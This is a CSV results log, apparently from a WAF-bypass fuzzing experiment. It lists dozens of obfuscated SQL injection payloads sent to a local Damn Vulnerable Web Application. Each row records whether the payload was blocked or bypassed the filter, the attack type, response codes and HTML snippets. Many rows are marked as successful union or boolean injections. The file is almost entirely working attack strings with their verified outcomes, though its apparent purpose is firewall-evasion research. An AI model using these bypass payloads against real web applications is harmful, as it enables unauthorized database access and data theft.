Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1+or+not+{x+(select%0b1)}=1=%0b(not+{a+1}=1)+,Blocked,No,None,Unknown,0.0275,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||+!+{x%0b(select%0b1)}=1=%0b(!+{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0233,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+1<@.%0b||+!%0b{a+1}=1=+(not~false)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0285,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0b!%0b{x+(select%0b1)}=1=%0b(not+1)--+,Blocked,No,None,piggyAtk,0.0199,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or%0b1<@+||+!~0=%0b(!%0b{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0246,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+!+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0211,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.019,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or+!%0b{x%0b(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0194,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot+1=+(not+{a%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0241,74.01,No,500,
0%27<@=1+||%0b!%0b{x%0b(select%0b1)}=1=%0b(false)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0112,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot%0b1=+(not%0btrue)+||',Bypassed,No,None,booleanAtk,0.0135,74.01,No,500,
0%27<@=.1%0bor+!+{a%0b1}=1=%0b(!%0btrue)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.023,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+0=%0b(not%7efalse)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.026,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0b!%0b{x+(select+1)}=1=+(not~false)%0b||',Blocked,No,None,Unknown,0.0059,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0111,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or%0bnot%0b{x+(select+1)}=1=%0b(!%0b{`if`+1}=1)--,Blocked,No,None,piggyAtk,0.0251,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor%0b!+{x+(select%0b1)}=1=%0b(not%0b{a+1}=1)+,Bypassed,No,None,Unknown,0.0311,74.01,No,500,
0'<@=1+or+!+true=%0b(not~0)%23,Bypassed,No,None,piggyAtk,0.0365,74.01,No,500,
0'<@!=1%0b||%0bnot+true=%0b(not%0b{`if`+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0185,73.77,No,500,
0'<@=1+or+!+{a+1}=1=+(not%0b{`if`+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0437,73.77,No,500,
0%27<@!=1.%0bor%0b!%0btrue=+(!+1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0197,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.038,73.77,No,500,
0'<@=.1+or+not%0b{a%0b1}=1=%0b(not+1)%0bor',Blocked,No,None,Unknown,0.0236,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+||%0b1+like+1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.04,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot+{x%0b(select+1)}=1=%0b(not%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0228,73.77,No,500,
0'<@=1.%0b||+!+1=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0546,73.77,No,500,
0'<@!=.1+||%0bnot%0b{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0448,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or+not+{x%0b(select+1)}=1=+(not+{`if`%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0481,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+!+{x%0b(select+1)}=1=%0b(not+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0385,73.77,No,500,
0'<@=.1+||%0bnot+{x%0b(select+1)}=1=+(!+true)+or',Bypassed,No,None,booleanAtk,0.0261,73.77,No,500,
0%27<@!=.1+||+!+{x+(select%0b1)}=1%0bis%0bfalse+or%27,Blocked,No,None,booleanAtk,0.03,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+!%0b{a+1}=1=%0b(not+{x%0b(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0434,73.77,No,500,
0%27<@=1%0b||+not%0b{x%0b(select+1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0322,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not%0b{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0307,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+not%0b{x+(select+1)}=1=+(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0241,73.77,No,500,
0%27||%0b@<@.%0bor%0bfalse=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,booleanAtk,0.027,73.77,No,500,
0'<@!=.1%0b||%0b{x+(select%0b1)}=1%0blike%0b{x%0b(select+1)}=1+||%27,Bypassed,No,None,Unknown,0.0293,73.77,No,500,
0%27<@=.1+||%0bnot+{x+(select+1)}=1=+(0)%0bor%27,Blocked,No,None,Unknown,0.0332,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||+not+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0461,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+!+{a+1}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0465,73.77,No,500,
0%27<@=.1%0bor%0b!~false=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0459,73.77,No,500,
0%27or+@<@.+or%0bnot+{a+1}=1=%0b(!%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0269,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||%0b{`if`+1}=1%0blike%0b{x+(select%0b1)}=1+or%27,Bypassed,No,None,Unknown,0.0154,73.89,No,500,
0'<@!=.1%0bor+not+{`if`+1}=1+is%0bfalse+or',Bypassed,No,None,booleanAtk,0.0194,74.01,No,500,
0'<@=1%0bor+not~false%0bis+false%0bor%27,Bypassed,No,None,booleanAtk,0.0403,74.01,No,500,
0%27<@!=1+or%0bnot%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1,Blocked,No,None,Unknown,0.0273,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor+not+{a+1}=1=%0b(!%0b{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0193,74.01,No,500,
0'<@!=.1+or+!+{x+(select+1)}=1=+(!+1)+or%27,Blocked,No,None,Unknown,0.0168,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or%0bnot+{a%0b1}=1=+(!+true)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0296,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot+{a%0b1}=1=+(!+true)+||%27,Blocked,No,None,Unknown,0.0193,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0bor%0b!+1=+(not~false)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.015,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+not+{x+(select+1)}=1=%0b(not+true)+||',Blocked,No,None,booleanAtk,0.0192,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||+!%7e0=+(not+{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0322,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||+not%7efalse=%0b(not~0)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0256,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+@<@+||+!+{x+(select+1)}=1=%0b(not+{`if`+1}=1,Blocked,No,None,Unknown,0.0112,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+not%0b{x%0b(select+1)}=1=+(!+{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0252,74.01,No,500,
0'<@!=1+or+!+true=+(!%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0216,74.01,No,500,
0%27<@!=1.%0b||%0b!+{a+1}=1=+(!%0b{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0161,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
